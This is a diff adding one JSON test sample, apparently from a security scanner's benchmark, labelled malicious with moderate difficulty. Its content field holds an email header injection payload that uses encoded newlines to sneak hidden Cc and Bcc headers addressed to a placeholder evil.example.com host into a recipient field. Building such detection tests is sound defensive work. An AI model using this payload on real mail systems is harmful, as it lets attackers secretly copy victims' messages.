@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::68::structural-variations::5",
+  "base_sample_id": "exp::email-webfetch::68",
+  "generator_id": "structural-variations",
+  "generator_version": "1.0.0",
+  "seed": -2034109292,
+  "content": "{\"message\": \"To: victim@target.example.com%0ACc:spy@evil.example.com%0ABcc:spy2@evil.example.com\\n\"}",
+  "content_hash": "66db364556e55b89984872bf61df57092b4cbfbc16c2d59650dbbd08cb45d47d",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "structural:json",
+  "difficulty": "moderate"
+}
